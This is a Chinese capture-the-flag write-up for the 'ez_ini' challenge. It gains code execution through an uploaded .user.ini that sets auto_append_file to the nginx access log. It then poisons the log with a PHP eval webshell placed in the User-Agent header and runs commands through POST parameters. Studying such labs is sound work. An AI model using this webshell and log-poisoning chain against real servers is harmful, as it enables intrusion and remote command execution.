## ez_ini


****

出题人：Jay17



![image-20240413222916775](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413222916775.png)

WP：

前面对文件上传过滤了哪些的测试步骤不做了。目前可上传**.user.ini**，但是过滤了**\<**。

![descript](C:/Users/26272/Pictures/media/87f283c21543098e68a04d297de753b4.png)

包含日志，这里用**auto_append_file=/var/log/nginx/access.log**。

步骤：

1、上传.user.ini配置文件，内容为auto_append_file=/var/log/nginx/access.log （日志文件路径） //自动包含日志文件

2、同目录下php文件中打开hackbar，UA头进行写马如“\<?php eval(\$_POST[1]);?\>”，发送。

3、POST传1=什么什么，进行RCE

![descript](C:/Users/26272/Pictures/media/f203670c85e972b7e75bafeec5092ed6.png)

上传成功后在upload.php处getshell就行了。

UA头写马\<?php eval(\$_POST[1]);?\>

![descript](C:/Users/26272/Pictures/media/9e8de03a48b27e8039736917f669bd2e.png)

POST传参执行命令。

![descript](C:/Users/26272/Pictures/media/a6b95e569b99bd655c45304d8e72b99f.png)







